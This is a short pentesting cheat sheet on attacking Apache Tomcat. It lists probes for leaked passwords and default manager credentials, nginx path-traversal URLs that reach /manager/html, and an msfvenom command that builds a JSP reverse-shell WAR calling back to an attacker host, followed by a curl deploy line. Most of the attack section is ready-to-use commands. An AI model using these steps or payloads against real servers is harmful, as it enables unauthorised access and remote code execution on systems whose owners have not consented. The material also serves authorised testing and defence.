---
description: Pentesting Apache Tomcat
---

# Apache Tomcat

> Apache Tomcat is a popular open source web server and Servlet container for Java code.

### Checklist

* [ ] Try to access "/auth.jsp". Might disclose some passwords in a backtrace.
* [ ] Try accessing /manager/html with [default credentials.](../../misc/default-passwords/apache-tomcat.md)
* [ ] Try path traversal (when deployed with nginx, explained [below](apache-tomcat.md#path-traversal-nginx-+-tomcat) ).

### Path traversal (nginx + tomcat)

When Apache Tomcat is in combination with nginx, we can perform a "path traversal" since nginx will not normalize the path and tomcat will rely on nginx validation. Learn more [here](https://www.youtube.com/watch?v=28xWcRegncw).

```
http://tomcat.site/..;/manager/html
http://tomcat.site/;param=value/manager/html
```

### RCE (uploading a .war file)

If we got access to the manager area, we can upload a .war reverse shell and gain RCE:&#x20;

{% code overflow="wrap" %}
```bash
#Generate a .war using msfvenom. Then upload and execute thorugh the gui.
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IPADDRESS LPORT=$PORT -f war > shell.war

#Or upload it using curl
curl http://$USER:$PASSWORD@localhost:$PORT/manager/text/deploy?path=/deployed_war.war
```
{% endcode %}
